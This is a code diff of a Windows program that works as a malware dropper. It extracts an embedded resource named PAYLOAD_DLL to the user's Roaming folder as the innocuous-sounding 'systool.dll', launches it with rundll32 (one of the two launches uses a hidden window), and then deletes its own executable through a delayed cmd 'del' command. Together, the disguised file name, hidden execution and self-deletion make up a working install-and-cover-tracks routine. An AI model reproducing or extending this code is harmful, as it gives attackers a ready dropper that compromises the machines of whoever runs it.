@@ -13,6 +13,7 @@
 HINSTANCE hInst;                                // 当前实例
 WCHAR* dll_path;
 
+// 1秒后删除自身, 并退出
 void selfDelete()
 {
     WCHAR command[24 + MAX_PATH] = L"cmd /c sleep 1 && del ";
@@ -23,7 +24,8 @@ void selfDelete()
     exit(0);
 }
 
-void extractResource(HINSTANCE hInstance)
+// 解压到Roaming文件夹, 并且把路径保存到全局变量dll_path
+void extractPayload(HINSTANCE hInstance)
 {
     HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(PAYLOAD_DLL), RT_RCDATA);
     if (!res)
@@ -48,14 +50,7 @@ void extractResource(HINSTANCE hInstance)
         ErrorExit(L"SHGetKnownFolderPath Error");
     }
     wprintf(L"%ls\n", path);
-    dll_path = (WCHAR*)malloc(wcslen(path) * 2 + 50);
-    if (dll_path == NULL)
-    {
-        ErrorExit(L"malloc");
-        return;
-    }
-    lstrcpy(dll_path, path);
-    lstrcat(dll_path, L"\\systool.dll");
+    dll_path = lstrcat_heap(path, L"\\systool.dll");
     FILE* f;
 
     _wfopen_s(&f, dll_path, L"wb");
@@ -79,8 +74,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     UNREFERENCED_PARAMETER(lpCmdLine);
     ConsoleInit();
 
-    extractResource(hInstance);
+    extractPayload(hInstance);
 
+    LPWSTR command = lstrcat_heap(dll_path, L",EntryPoint");
+    wprintf(command);
+    ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\rundll32.exe", command, NULL, SW_SHOWNORMAL);
+    ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\rundll32.exe", command, NULL, SW_HIDE);
+    free(command);
+    free(dll_path);
     selfDelete();
     MSG msg;
     // 主消息循环:
